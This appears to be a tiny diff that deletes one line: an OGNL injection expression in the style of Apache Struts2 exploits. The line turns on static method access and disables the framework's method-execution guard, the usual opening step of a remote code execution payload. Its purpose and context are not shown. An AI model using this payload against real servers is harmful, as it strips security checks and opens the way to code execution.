@@ -1,1 +1,0 @@
-%{#_memberAccess.allowStaticMethodAccess=true,#context["xwork.MethodAccessor.denyMethodExecution"]=false,#a=new java.lang.String("test").getClass().getClassLoader()}
